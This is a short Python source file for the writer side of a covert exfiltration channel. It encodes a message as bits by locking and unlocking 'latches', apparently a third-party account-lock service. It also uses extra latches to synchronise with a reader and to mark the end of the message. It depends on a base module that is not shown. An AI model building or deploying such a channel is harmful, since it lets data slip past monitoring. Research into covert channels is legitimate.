from latch_exfiltration import LatchExfiltration
import time
import os


class LatchExfiltrationWriter(LatchExfiltration):

    def __init__(self, message=''):
        # get account id from model
        LatchExfiltration.__init__(self)
        #self.exfiltrate_message(message)

    def exfiltrate_byte(self, bits_string):
        """Lock and unlock the latches acording to the binary representation of a given character
        
        Arguments:
            bits_string {String} -- Binary representation of an ascii character
        """
        for index, char in enumerate(bits_string):
            latch_status = self.dict_converted.get(str(index + 1), '')
            if char == '0':
                self.latch.unlock_latch(latch_status)
            else:
                self.latch.lock_latch(latch_status)
        print('Sending: ' + self.ascii_to_string(bits_string) + ' ---> ' + bits_string)
        
        self.latch.lock_latch(self.dict_converted.get('control', ''))

    def exfiltrate_message(self, message):
        """Exfiltrate the given message, first it's converted to a list of bits to lock the latches
        
        Arguments:
            message {String} -- Message to be exfiltrated
        """
        print('Writing "' + message + '"...' )
        while not self.latch.get_operation_status(self.dict_converted.get('reader', '')):
            time.sleep(0.2) 
        message = self.read_string_to_byte(message) # secret
        for byte in message:
            self.exfiltrate_byte(byte)
            while self.latch.get_operation_status(self.dict_converted.get('control', '')):
                time.sleep(0.5)
        self.latch.lock_latch(self.dict_converted.get('end', ''))




